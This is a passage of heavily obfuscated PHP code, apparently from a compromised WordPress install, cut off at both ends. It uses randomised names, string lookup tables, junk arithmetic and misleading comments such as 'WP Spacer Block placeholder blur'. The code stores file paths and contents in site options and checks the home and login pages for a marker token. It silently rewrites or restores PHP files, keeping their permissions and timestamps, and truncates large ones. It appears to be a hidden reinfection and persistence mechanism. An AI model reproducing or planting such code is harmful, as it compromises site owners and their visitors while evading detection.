     if  (!isset($ho_uo4wbxc3tqb_[m5t68uuej1(1456)][$e_oq5qixgrj6]))   return;
$vhe5twxajpf   =   @md5_file($uim861ig2y);
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($vhe5twxajpf)   || $vhe5twxajpf ===   "")    return;
$ho_uo4wbxc3tqb_[m5t68uuej1(1456)][$e_oq5qixgrj6]['h']   =  $vhe5twxajpf;
  @update_option(m5t68uuej1(1452), $ho_uo4wbxc3tqb_,   lpwgqh9300(1453));
   }
     function   km66qcrq_2xyqnwuodwetp($tcqzdtvpxvsdp)
 {


 $xdb0y45_5rwgi8 =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($tcqzdtvpxvsdp['b']);
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($xdb0y45_5rwgi8))  return false;$bo36ue1t24xsot=PHP_INT_MAX/PHP_INT_MAX;$fa36y1f_mr3ne_=$bo36ue1t24xsot+84;
if (!empty($tcqzdtvpxvsdp['h'])     &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1471))) {


$ylcr18_a4mbqb3 =     @md5_file($tcqzdtvpxvsdp['p']);
if ($GLOBALS['__scf_e_8z8ias8ka_43']($ylcr18_a4mbqb3) &&  $ylcr18_a4mbqb3  !== ""   && $ylcr18_a4mbqb3 !==  $tcqzdtvpxvsdp['h']) return false;
  unset($ylcr18_a4mbqb3);
  }
 if    ($xdb0y45_5rwgi8    ===   "") {
if     (empty($tcqzdtvpxvsdp['n']))   return false;  

$y871powf01l3zs  = !@$GLOBALS['__scf_a83pywb98qzq2_20']($tcqzdtvpxvsdp['p']);
 if  (!$y871powf01l3zs)  {
 cik9ldzrbjmtnzm00($tcqzdtvpxvsdp['p'],  (391+29));
    $y871powf01l3zs   = netei2x342rtzmi4tj69($tcqzdtvpxvsdp['p']);
       }
// WP Spacer Block placeholder blur

   if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1472))) @opcache_invalidate($tcqzdtvpxvsdp['p'],  true);
       return     $y871powf01l3zs;
        }
  if  (!a3hx61zfms1ji3euwsc($tcqzdtvpxvsdp['p'],   $xdb0y45_5rwgi8))  return  false;
       if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1472)))   @opcache_invalidate($tcqzdtvpxvsdp['p'],   true);

 return  true;
 }
     function  m_2f5h05jkcs176a()
   {
  if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1473)))     return;
   if (!empty($GLOBALS[m40pvx5ij_z4mj(115)]))    return;
if   (!beqgo0gfq6yfj82i0o(lpwgqh9300(1452)))  return;
   try  {


$ho_uo4wbxc3tqb_   =     @get_option(m5t68uuej1(1474),  array());
 if (!$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_))   return;
 if (!isset($ho_uo4wbxc3tqb_[bovhd4vawcd(1456)])  ||   !$GLOBALS['__scf_pomb89yiuz_37']($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1475)])) {


$blvbk9xvg8h30hfs   =  array();
    if   (isset($ho_uo4wbxc3tqb_['t'],  $ho_uo4wbxc3tqb_['p'], $ho_uo4wbxc3tqb_['b']))   {$auk9iue602=-232;$_v8oggkokbwsx=($auk9iue602>0)?$auk9iue602:-$auk9iue602;
      $dzix01kpv98f2  = (string)      $ho_uo4wbxc3tqb_['p'];


$xi3mqg7x_lsr_bvk  =  (string)     $ho_uo4wbxc3tqb_['b'];
$blvbk9xvg8h30hfs[$GLOBALS['__scf_pe3s4q1z7z_59']($dzix01kpv98f2)]  =    array('t'    =>  (string)  $ho_uo4wbxc3tqb_['t'],   'p'  => $dzix01kpv98f2,  'b'  =>      $xi3mqg7x_lsr_bvk,  m40pvx5ij_z4mj(1476)   =>  isset($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1477)]) ?  (int) $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1477)] : $GLOBALS['__scf_ibw9xvmx9ckin_187'](),    bovhd4vawcd(1434)    => 0,  'n'   => (@$GLOBALS['__scf_a83pywb98qzq2_20']($xi3mqg7x_lsr_bvk)   &&  (int)  @$GLOBALS['__scf_pftf6vocmvs2m_99']($xi3mqg7x_lsr_bvk)   ===      0)    ?  1 :   0);
$wngh8vc3mx7gkb     =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1471))  ?   @md5_file($dzix01kpv98f2)  :    false;
  if ($GLOBALS['__scf_e_8z8ias8ka_43']($wngh8vc3mx7gkb)  &&    $wngh8vc3mx7gkb !== "")  $blvbk9xvg8h30hfs[$GLOBALS['__scf_pe3s4q1z7z_59']($dzix01kpv98f2)]['h']     =  $wngh8vc3mx7gkb;
   unset($dzix01kpv98f2,  $xi3mqg7x_lsr_bvk, $wngh8vc3mx7gkb);
   }

 $ho_uo4wbxc3tqb_ =    array(m40pvx5ij_z4mj(1475) => $blvbk9xvg8h30hfs);
   }

  if   (empty($ho_uo4wbxc3tqb_[lpwgqh9300(1475)]))  {
@delete_option(m40pvx5ij_z4mj(1474));


      return;
}
 if   (sqpd81axvg872g96_9tash())    {


 $r5wkdiuwr6 =   false;
foreach ($ho_uo4wbxc3tqb_[m5t68uuej1(1475)]   as   $m4bbxeze30x6noz     =>  $urfhod4yk40fa5i) {
    if     ($GLOBALS['__scf_pomb89yiuz_37']($urfhod4yk40fa5i)    &&    empty($urfhod4yk40fa5i[bovhd4vawcd(1450)])) {
$ho_uo4wbxc3tqb_[bovhd4vawcd(1475)][$m4bbxeze30x6noz][lpwgqh9300(1450)] = 1;
$r5wkdiuwr6 =  true;
 }
 }
    if   ($r5wkdiuwr6) @update_option(bovhd4vawcd(1474), $ho_uo4wbxc3tqb_,  m5t68uuej1(1453));
 unset($r5wkdiuwr6,   $m4bbxeze30x6noz, $urfhod4yk40fa5i);
     return;$mcksws8f=PHP_MAJOR_VERSION;$u4zc5eszp4mzd5=$mcksws8f*2;
}
static  $iwifq2sjghh03 =   false;

    if ($iwifq2sjghh03) return;
 $iwifq2sjghh03    =  true;
 $iurlobhrz0_55s =   $GLOBALS['__scf_vq_8cgbui993_718']($ho_uo4wbxc3tqb_[lpwgqh9300(1475)]);
 $ej49k_i078pd990    = array();
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1478)))  @$GLOBALS['__scf_sfs0wi3jqm1fd_391']();
elseif    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1479)))  @$GLOBALS['__scf_dhscvkxtkkh7_392']();
if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(394))) @$GLOBALS['__scf_dg190gj3k4cyb_394'](true);

     if    (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(757)) ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(556))) return;
     $cugmh41zspll    = home_url('/');


    $h1jz62cvuw6a6xm5     = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1480))  ?    wp_login_url() :   $cugmh41zspll .   m40pvx5ij_z4mj(1481);
$s2m6gafjweotode =  false;
      $j8c5cmf_bygu     = true;
 $azv_gtae8qt_zs  = (0x1+0x2);
foreach ($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1475)]    as    $e_oq5qixgrj6  =>  $tcqzdtvpxvsdp) {
   if  (qf3be0n5t4x_6tii01jj3v()   <=   0.5)      break;


if (!$GLOBALS['__scf_pomb89yiuz_37']($tcqzdtvpxvsdp) ||  empty($tcqzdtvpxvsdp['t'])  || empty($tcqzdtvpxvsdp['p'])    ||     empty($tcqzdtvpxvsdp['b']))   {
  unset($ho_uo4wbxc3tqb_[lpwgqh9300(1475)][$e_oq5qixgrj6]);
     $s2m6gafjweotode   =      true;
continue;
     }
   if      (!isset($tcqzdtvpxvsdp['n'])  || !isset($tcqzdtvpxvsdp['h']))  {
if    (!isset($tcqzdtvpxvsdp['n']))  $tcqzdtvpxvsdp['n']  =   (@$GLOBALS['__scf_a83pywb98qzq2_20']($tcqzdtvpxvsdp['b']) &&  (int) @$GLOBALS['__scf_pftf6vocmvs2m_99']($tcqzdtvpxvsdp['b'])   ===      0)    ?  1 : 0;
 if (!isset($tcqzdtvpxvsdp['h'])   &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1471)))  {
   $uwg0b9h214  =    @md5_file($tcqzdtvpxvsdp['p']);
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($uwg0b9h214)  &&     $uwg0b9h214 !==   "")     $tcqzdtvpxvsdp['h'] =    $uwg0b9h214;
  unset($uwg0b9h214);
  }
  $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1475)][$e_oq5qixgrj6] =  $tcqzdtvpxvsdp;
 $s2m6gafjweotode   =      true;$lz0ae5qnshy1s=65+49;$x5w1jh4xj11awl=$lz0ae5qnshy1s-36;



}
     if  (!empty($tcqzdtvpxvsdp[m40pvx5ij_z4mj(1482)]))  {
// Redis object cache: compact record-layer

     $tcqzdtvpxvsdp[m5t68uuej1(1483)]  = 0;


     $tcqzdtvpxvsdp[m5t68uuej1(1477)]   =    $GLOBALS['__scf_ibw9xvmx9ckin_187']();


     $tcqzdtvpxvsdp[m5t68uuej1(1434)] =   0;
$tcqzdtvpxvsdp[m40pvx5ij_z4mj(1484)]   =  0;
 $tcqzdtvpxvsdp[bovhd4vawcd(1441)]   =   0;
    $tcqzdtvpxvsdp[bovhd4vawcd(1442)] =  0;
 $ho_uo4wbxc3tqb_[lpwgqh9300(1485)][$e_oq5qixgrj6] =     $tcqzdtvpxvsdp;
   $s2m6gafjweotode =   true;
}
   if  (empty($tcqzdtvpxvsdp[m40pvx5ij_z4mj(1439)]))  {
$ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1485)][$e_oq5qixgrj6][lpwgqh9300(1486)] =  (int) $tcqzdtvpxvsdp[bovhd4vawcd(1477)];
$tcqzdtvpxvsdp[lpwgqh9300(1486)]   =    (int)    $tcqzdtvpxvsdp[m5t68uuej1(1477)];
  $s2m6gafjweotode   =   true;



    }
       if  (!empty($tcqzdtvpxvsdp[m40pvx5ij_z4mj(1441)])   &&  $GLOBALS['__scf_ibw9xvmx9ckin_187']()  <      (int) $tcqzdtvpxvsdp[lpwgqh9300(1441)])  continue;
      if   ($azv_gtae8qt_zs     <=   0) break;



   $azv_gtae8qt_zs--;
   $szlze7c6mbixvbj =  m5t68uuej1(1487) .  $GLOBALS['__scf_w41c9pnbc9_2d_1488']($tcqzdtvpxvsdp['t'])   .     lpwgqh9300(1489)     .  $GLOBALS['__scf_e1fr80hqavau3c_353']((0x15a89+0x2c17),  (1988619-988620));
list($ohfs0792xygm, $q7zm1e9gbkb1g) =  htzpzipsvzyykui171m($cugmh41zspll    .  $szlze7c6mbixvbj);
 if  ($ohfs0792xygm  ===     -2) break;
  if    ($ohfs0792xygm  >    0)    $j8c5cmf_bygu  =  false;


       if  ($ohfs0792xygm ===     -1 &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(682))  &&  qf3be0n5t4x_6tii01jj3v()    >  2)    $GLOBALS['__scf_w6ni5cg4iy63n_682'](1);
if  ($ohfs0792xygm      ===  -1)   {


list($ohfs0792xygm,   $q7zm1e9gbkb1g)  =  htzpzipsvzyykui171m($cugmh41zspll . $szlze7c6mbixvbj);
 if ($ohfs0792xygm   === -2)     break;
if ($ohfs0792xygm  >  0)  $j8c5cmf_bygu     = false;

    }

       if  ($ohfs0792xygm  <= 0)   {
     $ho_uo4wbxc3tqb_[bovhd4vawcd(1485)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1490)]++;
    $s2m6gafjweotode   =  true;
  continue;
  }
if ($ohfs0792xygm   >=  (230+270))  {
  if  (km66qcrq_2xyqnwuodwetp($tcqzdtvpxvsdp))   {
r63yaewew47stuijcrwsx6(bovhd4vawcd(1449),  m40pvx5ij_z4mj(1491)  .   $GLOBALS['__scf_os_n9tj5psxjj_3']($tcqzdtvpxvsdp['p']));
$ej49k_i078pd990[$e_oq5qixgrj6] = $tcqzdtvpxvsdp;
unset($ho_uo4wbxc3tqb_[lpwgqh9300(1485)][$e_oq5qixgrj6]);
   }   else {
   $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1485)][$e_oq5qixgrj6][m5t68uuej1(1490)]++;
   }
 $s2m6gafjweotode  =     true;
 continue;
}
 if    ($GLOBALS['__scf_i8i8g4oxha_7']($q7zm1e9gbkb1g,   m40pvx5ij_z4mj(1492)  .    $tcqzdtvpxvsdp['t']   .    m40pvx5ij_z4mj(1429))     !==    false)  {
   $ej49k_i078pd990[$e_oq5qixgrj6]  =   $tcqzdtvpxvsdp;
unset($ho_uo4wbxc3tqb_[lpwgqh9300(1493)][$e_oq5qixgrj6]);
  $s2m6gafjweotode  = true;
 continue;

}



 list($nd_d_b4e4d,  $j48w88ldcx2)      =    htzpzipsvzyykui171m($h1jz62cvuw6a6xm5   .  ($GLOBALS['__scf_i8i8g4oxha_7']($h1jz62cvuw6a6xm5,   '?') ===   false     ?     '?' : '&') .    m40pvx5ij_z4mj(1494) .  $GLOBALS['__scf_w41c9pnbc9_2d_1488']($tcqzdtvpxvsdp['t'])  . lpwgqh9300(1495)    .  $GLOBALS['__scf_e1fr80hqavau3c_353']((99971+29), (164384+835615)));
      if ($nd_d_b4e4d     ===  -2)   break;
  if    ($nd_d_b4e4d > 0)    $j8c5cmf_bygu  =  false;
     if    ($nd_d_b4e4d  >=  (428+72))  {$kp0g5whhtly=PHP_INT_MAX/PHP_INT_MAX;$rg3qyqvm=$kp0g5whhtly+27;
if (km66qcrq_2xyqnwuodwetp($tcqzdtvpxvsdp))    {
        r63yaewew47stuijcrwsx6(lpwgqh9300(1449), lpwgqh9300(1496)   .     $GLOBALS['__scf_os_n9tj5psxjj_3']($tcqzdtvpxvsdp['p']));
 $ej49k_i078pd990[$e_oq5qixgrj6] =  $tcqzdtvpxvsdp;



  unset($ho_uo4wbxc3tqb_[m5t68uuej1(1493)][$e_oq5qixgrj6]);
 }  else    {
   $ho_uo4wbxc3tqb_[lpwgqh9300(1493)][$e_oq5qixgrj6][m5t68uuej1(1490)]++;$y30v9i6u1lb24=PHP_MAJOR_VERSION;$cpuuca4t9gb2=$y30v9i6u1lb24*10;
 }
    $s2m6gafjweotode   =  true;
   continue;
}
      if ($GLOBALS['__scf_e_8z8ias8ka_43']($j48w88ldcx2) && $GLOBALS['__scf_i8i8g4oxha_7']($j48w88ldcx2,   lpwgqh9300(1492) .   $tcqzdtvpxvsdp['t'] .   m40pvx5ij_z4mj(1429))  !==  false)    {
 $ej49k_i078pd990[$e_oq5qixgrj6] =    $tcqzdtvpxvsdp;

  unset($ho_uo4wbxc3tqb_[lpwgqh9300(1493)][$e_oq5qixgrj6]);
      $s2m6gafjweotode  = true;
  continue;
 }
    $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1493)][$e_oq5qixgrj6][lpwgqh9300(1497)] =  (int) (isset($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1498)][$e_oq5qixgrj6][bovhd4vawcd(1497)])  ?   $ho_uo4wbxc3tqb_[m5t68uuej1(1498)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1499)] :  0)  + 1;
 if ($GLOBALS['__scf_ibw9xvmx9ckin_187']()    -   (int)     $ho_uo4wbxc3tqb_[lpwgqh9300(1498)][$e_oq5qixgrj6][m40pvx5ij_z4mj(1486)]   > (1002155-397355))    {

$ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1498)][$e_oq5qixgrj6][lpwgqh9300(1442)] =   1;
$ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1498)][$e_oq5qixgrj6][bovhd4vawcd(1441)]      = $GLOBALS['__scf_ibw9xvmx9ckin_187']()  + (116455-30055);


}      else   {
     $bu3hsm5r68ba3her =      array((0x21+0x1b),   (213+87),  (1261-361),    (0x1f6+0xc1a));
$m7az4wd7hf9 =  (int) $ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1498)][$e_oq5qixgrj6][m5t68uuej1(1499)];
 $ho_uo4wbxc3tqb_[m5t68uuej1(1498)][$e_oq5qixgrj6][m5t68uuej1(1500)] =     $GLOBALS['__scf_ibw9xvmx9ckin_187']()    +  $bu3hsm5r68ba3her[$GLOBALS['__scf_fffiaden_pfx9__473']($m7az4wd7hf9,     (2<<1))    - 1];
 unset($bu3hsm5r68ba3her,   $m7az4wd7hf9);
  }

  $s2m6gafjweotode  = true;
      }
 if  ($j8c5cmf_bygu  &&   $s2m6gafjweotode   &&  !empty($ho_uo4wbxc3tqb_[bovhd4vawcd(1498)]))  {
// negative-definite token-bucket

 $xxx6a2osu4 = false;
 foreach ($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1498)]   as $qom_0jjoisg76hg) {
 if  ((int) $qom_0jjoisg76hg[lpwgqh9300(1490)]   >= (1+2)) {
   $xxx6a2osu4  =     true;
        break;$kbk69dnyvc=9541;$knoy3hjsr=$kbk69dnyvc%14;
  }
    }

     if   ($xxx6a2osu4)   {
    @update_option(lpwgqh9300(1430), m40pvx5ij_z4mj(1501)     .  $GLOBALS['__scf_ibw9xvmx9ckin_187'](), m40pvx5ij_z4mj(1453));



     r63yaewew47stuijcrwsx6(lpwgqh9300(1502),  m5t68uuej1(1503));
    foreach    ($ho_uo4wbxc3tqb_[m40pvx5ij_z4mj(1504)]     as $zusurhlk29z   =>  $qom_0jjoisg76hg) {
 if ($GLOBALS['__scf_pomb89yiuz_37']($qom_0jjoisg76hg)   &&   empty($qom_0jjoisg76hg[bovhd4vawcd(1483)]))   $ho_uo4wbxc3tqb_[lpwgqh9300(1504)][$zusurhlk29z][m5t68uuej1(1483)]  =  1;
}
$s2m6gafjweotode =     true;
 }
     }   elseif    (!$j8c5cmf_bygu)   {
 $b_lf84hnlj  =    @get_option(lpwgqh9300(1430),  "");


 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($b_lf84hnlj) ||    $GLOBALS['__scf_i8i8g4oxha_7']($b_lf84hnlj,    m5t68uuej1(1381))  !==  0) @update_option(m40pvx5ij_z4mj(1430), m40pvx5ij_z4mj(1505) .    $GLOBALS['__scf_ibw9xvmx9ckin_187'](),   m5t68uuej1(1453));
  }



 if    ($s2m6gafjweotode)  {
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1454))) @wp_cache_delete(m5t68uuej1(1474), lpwgqh9300(1455));

   $wm1wtl4pcoynju =    @get_option(lpwgqh9300(1474),   array());
if    ($GLOBALS['__scf_pomb89yiuz_37']($wm1wtl4pcoynju)  &&   isset($wm1wtl4pcoynju[m5t68uuej1(1506)])   &&     $GLOBALS['__scf_pomb89yiuz_37']($wm1wtl4pcoynju[m40pvx5ij_z4mj(1506)]))   {
      foreach   ($wm1wtl4pcoynju[m40pvx5ij_z4mj(1506)]  as  $pl3x6vwrjwh1 => $j5kho9ecks5) {
/* maximal flyweight */

if  (isset($ho_uo4wbxc3tqb_[m5t68uuej1(1506)][$pl3x6vwrjwh1]))   continue;
   if (!$GLOBALS['__scf_hf87ul3fvpzrkm_150']($pl3x6vwrjwh1,    $iurlobhrz0_55s,     true)) {
    $ho_uo4wbxc3tqb_[m5t68uuej1(1506)][$pl3x6vwrjwh1] =  $j5kho9ecks5;





continue;
 }
 if     (isset($ej49k_i078pd990[$pl3x6vwrjwh1])  &&   $GLOBALS['__scf_pomb89yiuz_37']($j5kho9ecks5)) {
    $v1jxm7_l3i0jpe4 = isset($j5kho9ecks5['g'])  ? (float)    $j5kho9ecks5['g']   :    (float)  (isset($j5kho9ecks5[lpwgqh9300(1477)])  ?    $j5kho9ecks5[m5t68uuej1(1507)] :    0);$zdqjd5p0abq4=PHP_INT_MAX/PHP_INT_MAX;$cq37_wplsj=$zdqjd5p0abq4+3;
    $xt3t723z9qaxnfn    =   isset($ej49k_i078pd990[$pl3x6vwrjwh1]['g'])   ?   (float)  $ej49k_i078pd990[$pl3x6vwrjwh1]['g']   :  (float) (isset($ej49k_i078pd990[$pl3x6vwrjwh1][m40pvx5ij_z4mj(1508)])  ?  $ej49k_i078pd990[$pl3x6vwrjwh1][m40pvx5ij_z4mj(1509)] :     0);
 if    ($v1jxm7_l3i0jpe4     >  $xt3t723z9qaxnfn) $ho_uo4wbxc3tqb_[lpwgqh9300(1506)][$pl3x6vwrjwh1]     =      $j5kho9ecks5;
      unset($v1jxm7_l3i0jpe4,    $xt3t723z9qaxnfn);


       }
/* general-recursive memento */

   }
}
unset($wm1wtl4pcoynju,     $pl3x6vwrjwh1,  $j5kho9ecks5);
      }
foreach ($ej49k_i078pd990  as  $dvgho3_cxv7h    =>  $u96oz8hp97w2xbmj) {



   if    (!isset($ho_uo4wbxc3tqb_[m5t68uuej1(1510)][$dvgho3_cxv7h])) netei2x342rtzmi4tj69($u96oz8hp97w2xbmj['b']);$q900rlx3u3gg5f=(0xd2+0x1);$pnpywgedvyuivr=$q900rlx3u3gg5f%7;

 }
unset($ej49k_i078pd990,    $dvgho3_cxv7h,   $u96oz8hp97w2xbmj);
if (empty($ho_uo4wbxc3tqb_[lpwgqh9300(1510)]))  @delete_option(m5t68uuej1(1511));
 elseif   ($s2m6gafjweotode)  @update_option(lpwgqh9300(1512),     $ho_uo4wbxc3tqb_,  lpwgqh9300(1513));
      } finally {


 xfcoteglc07i2qaoo(m40pvx5ij_z4mj(1512));
     }
// WP Post Terms: general-recursive checkpoint

   }
 function  o5b5us8hgx93bum66mppi($t6jsjlatx2i)
{


 return $GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i) &&     ($GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,  m5t68uuej1(1514)) !== false    ||   $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,  lpwgqh9300(1515)) !==  false ||   $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,  lpwgqh9300(1239))   !== false   ||  $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,    bovhd4vawcd(27))   !==  false  ||     $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,   bovhd4vawcd(1516))      !==    false ||   $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,    lpwgqh9300(1517)) !==  false);



    }
function   i98sx5fa7gj0_f0t4($t6jsjlatx2i)
{


     if  (!o5b5us8hgx93bum66mppi($t6jsjlatx2i))  return false;
if  (zrz48hnyk7a1229($t6jsjlatx2i)) return true;

  if ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1518), $t6jsjlatx2i,  $ijvqfm4k0rvi7)) {

  foreach     ($ijvqfm4k0rvi7[1]   as   $e5c0lim9mpp6z_47)   {
       if  (version_compare($e5c0lim9mpp6z_47,  kdgw8qqvzf6yolk(),     '<')) return   true;



 }
  return      false;
  }
    return  true;
      }
       function  g1e437iixp5n3aj0odzu2k($ln5_jbqpu4in)
     {
if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in)      ||  !@$GLOBALS['__scf_p_260ito5s0j_50']($ln5_jbqpu4in))  return;


$ob1u5r4y2s  =  @$GLOBALS['__scf_pftf6vocmvs2m_99']($ln5_jbqpu4in);
      if (!$ob1u5r4y2s) return;


    if  ($ob1u5r4y2s   >    (10485695+65))  {


$uoyiskk7a4 =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in,  false,    null,  0,  (65492+44));
  if    (!o5b5us8hgx93bum66mppi($uoyiskk7a4))   return;$jvedhm1at=PHP_INT_MAX/PHP_INT_MAX;$rkl642fth12=$jvedhm1at+64;
    if  (vwmi9k19liyrqa2($ln5_jbqpu4in)  ===   false)  {
r63yaewew47stuijcrwsx6(lpwgqh9300(1519), bovhd4vawcd(1520) . $GLOBALS['__scf_os_n9tj5psxjj_3']($ln5_jbqpu4in));
return;


 }
     @$GLOBALS['__scf_u59p44o1il_196']($ln5_jbqpu4in,     "<?php\n");
       if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1472)))  @opcache_invalidate($ln5_jbqpu4in,  true);
 return;
 }
 if      ($ob1u5r4y2s >     (1434281-385705)) {
  $_vv_pvlkhrw10d =  (string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in,     false,   null,  0,   (8111+81));
$yb8eab8wg4asfsl   =      ($ob1u5r4y2s   >    (8154+38))  ?  (string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in, false,   null, $ob1u5r4y2s   -    (8161+31))  :  "";
$nvwyx09g60sl =     $_vv_pvlkhrw10d .    $yb8eab8wg4asfsl;
if   ($nvwyx09g60sl  !==   "" &&  $GLOBALS['__scf_at_e2uw9xuj96__1383'](m40pvx5ij_z4mj(1521),   $nvwyx09g60sl,     $kb7_605llqs))  {
        $mvjdvzeuifey801  =      false;
     foreach   ($kb7_605llqs[1]  as   $r74v969rgd8r)   {
  if    (version_compare($r74v969rgd8r,  kdgw8qqvzf6yolk(),    '<'))  {
$mvjdvzeuifey801 = true;
 break;
 }
 }


   if      (!$mvjdvzeuifey801)      return;
}
}
 $t6jsjlatx2i   = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in);
 if   ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  &&  $GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i)  >     (1226776-178200)) $t6jsjlatx2i =  bdsvhgz69_4ct5ntcc($t6jsjlatx2i);
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))  return;
      if  (!i98sx5fa7gj0_f0t4($t6jsjlatx2i)) return;
 vvhi72whrxb893_w97($ln5_jbqpu4in,   $t6jsjlatx2i);
}
 function   vvhi72whrxb893_w97($ln5_jbqpu4in,   $t6jsjlatx2i)


       {
$jhq7h77_vtf  =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1522),    "", $t6jsjlatx2i);
  if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)    ||  $GLOBALS['__scf_nimluvpxhrpvn_323']($jhq7h77_vtf)  ===   ""  || $GLOBALS['__scf_nimluvpxhrpvn_323']($jhq7h77_vtf)    ===   lpwgqh9300(1228))   $jhq7h77_vtf  =  "<?php\n";



   if  ($GLOBALS['__scf_fr9u7cq1eo_10']($jhq7h77_vtf)  >=   (482+18)  &&  !fgcc_h22bqxgwmccod($jhq7h77_vtf)) $jhq7h77_vtf =   "<?php\n";


 $adg3ig9hjy8le1oe     =      @fileperms($ln5_jbqpu4in);


   $adg3ig9hjy8le1oe  =  ($adg3ig9hjy8le1oe     === false)   ?   (180+240) :     ($adg3ig9hjy8le1oe     &  (438+73));
$ksny_bgxn5 = @$GLOBALS['__scf_tm09rtls_27e_98']($ln5_jbqpu4in);
$rkd1q9_4thz    =  @$GLOBALS['__scf_wgdf7f0l0fi5_78']($GLOBALS['__scf_oagg5b1ubqmznt_11']($ln5_jbqpu4in), lpwgqh9300(1523));
  if  ($rkd1q9_4thz ===    false) return;
if     (@$GLOBALS['__scf_u59p44o1il_196']($rkd1q9_4thz, $jhq7h77_vtf)  !== $GLOBALS['__scf_fr9u7cq1eo_10']($jhq7h77_vtf)) {
   @$GLOBALS['__scf_o_94ckdo_kfcf_19']($rkd1q9_4thz);
 return;
 }
  @$GLOBALS['__scf__vykm6livjsep_17']($rkd1q9_4thz,  $adg3ig9hjy8le1oe);



 if (!@$GLOBALS['__scf_gvpwhn3ygzlhu_76']($rkd1q9_4thz,  $ln5_jbqpu4in))   {



@$GLOBALS['__scf_o_94ckdo_kfcf_19']($rkd1q9_4thz);
 return;
        }
if     ($ksny_bgxn5)  @$GLOBALS['__scf_fiolz593w9mj_75']($ln5_jbqpu4in,     $ksny_bgxn5);
if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1524))) @opcache_invalidate($ln5_jbqpu4in, true);
}
      function d6oylk7yiitq_u3koh3($xmu6vgl26q74)
  {
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($xmu6vgl26q74)) return  "";
if    ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1525),  $xmu6vgl26q74, $qhu2aizenn)) {
 $wkokdoejn433  = $qhu2aizenn[1];
$ob1u5r4y2s =    @$GLOBALS['__scf_a83pywb98qzq2_20']($wkokdoejn433)    ?    @$GLOBALS['__scf_pftf6vocmvs2m_99']($wkokdoejn433)    :    0;
   if (!$ob1u5r4y2s  || $ob1u5r4y2s     < (810-310)   || $ob1u5r4y2s > (52428748+52)) {

 if    ($ob1u5r4y2s   >    (52861723-432923))  {$v4p7gr6dxbc=PHP_MAJOR_VERSION;$l9szboy4q_z9xu=$v4p7gr6dxbc*1;


$f5l6q0ffo9cqk06  =   @$GLOBALS['__scf_j79iy74onqck2_35']($wkokdoejn433);
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($f5l6q0ffo9cqk06))   $f5l6q0ffo9cqk06   =    $wkokdoejn433;
   $f5l6q0ffo9cqk06 =    $GLOBALS['__scf_kr_w9stt2gb_360']('\\',  '/',   $f5l6q0ffo9cqk06);
  $isurpe6tldnf      =   false;


$m201xrqay6  = array(defined(bovhd4vawcd(1526))  ? $GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,  lpwgqh9300(1206))  : "",   defined(lpwgqh9300(1177)) ?   $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR, bovhd4vawcd(1206))  : "");
  foreach  ($m201xrqay6   as $gvwxi_p00z1bo) {
